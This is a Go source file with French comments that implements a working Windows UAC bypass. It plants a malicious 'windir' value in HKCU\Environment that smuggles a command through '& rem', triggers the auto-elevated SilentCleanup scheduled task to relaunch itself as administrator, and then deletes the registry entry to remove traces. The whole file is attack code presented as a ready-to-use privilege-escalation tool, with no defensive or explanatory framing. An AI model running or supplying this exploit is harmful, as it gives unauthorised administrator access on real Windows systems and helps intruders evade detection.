//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"time"
)

// CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
func CheckAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// ExploitUAC : Réalise un bypass de l'UAC via la tâche planifiée SilentCleanup
// Cette méthode est actuellement l'une des plus fiables sur les builds récentes de Windows 11 (23H2/24H2).
// Elle exploite le fait que la tâche SilentCleanup s'exécute avec les privilèges maximum
// et utilise la variable d'environnement %windir% sans vérification de chemin absolu.
func ExploitUAC() bool {
	fmt.Println("[*] Phase 1 : Hijacking de la variable d'environnement %windir%...")

	key := `Environment`
	selfPath, _ := os.Executable()

	// Le payload va relancer ce même binaire avec les droits élevés.
	// On ajoute "& rem" pour neutraliser la suite du chemin que Windows va tenter d'ajouter.
	payload := fmt.Sprintf("cmd.exe /c start \"\" \"%s\" & rem", selfPath)

	// Ajout de la variable windir malicieuse dans l'environnement de l'utilisateur actuel
	err := exec.Command("reg", "add", "HKCU\\"+key, "/v", "windir", "/t", "REG_SZ", "/d", payload, "/f").Run()
	if err != nil {
		fmt.Println("[-] Erreur lors de la modification du registre.")
		return false
	}

	fmt.Println("[*] Phase 2 : Déclenchement de la tâche planifiée SilentCleanup...")

	// On demande au planificateur de tâches de lancer "SilentCleanup".
	// Ce processus est "Auto-Elevated", il héritera de notre variable %windir% modifiée.
	err = exec.Command("schtasks", "/run", "/tn", "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup", "/i").Run()
	if err != nil {
		fmt.Printf("[-] Impossible de lancer la tâche planifiée : %v\n", err)
		return false
	}

	fmt.Println("[*] Phase 3 : Nettoyage des traces (Nettoyage du registre)...")

	// On laisse un peu de temps à la tâche pour se lancer
	time.Sleep(3 * time.Second)

	// Suppression de la variable windir pour restaurer le comportement normal du système
	exec.Command("reg", "delete", "HKCU\\"+key, "/v", "windir", "/f").Run()

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 PrivEsc Module v7.0 (Ultimate)")
	fmt.Println("   Target: Windows 11 23H2 (Build 22631.6199)")
	fmt.Println("   Technique: SilentCleanup Environment Hijack")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("\n[+] ############################################")
		fmt.Println("[+] #   SUCCÈS : PRIVILÈGES ÉLEVÉS ACQUIS !    #")
		fmt.Println("[+] ############################################")
		fmt.Println("\n[*] Utilisateur identifié :")
		out, _ := exec.Command("whoami").Output()
		fmt.Print(string(out))

		fmt.Println("\nAppuyez sur Entrée pour quitter cette session élevée...")
		var input string
		fmt.Scanln(&input)
		return
	}

	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Tentative d'escalade via SilentCleanup...")

	if ExploitUAC() {
		fmt.Println("\n[+] L'exploit a été déclenché.")
		fmt.Println("[*] Le binaire va se relancer en mode ADMINISTRATEUR d'ici quelques secondes.")
	} else {
		fmt.Println("[-] ÉCHEC : L'escalade a été bloquée ou a échoué.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
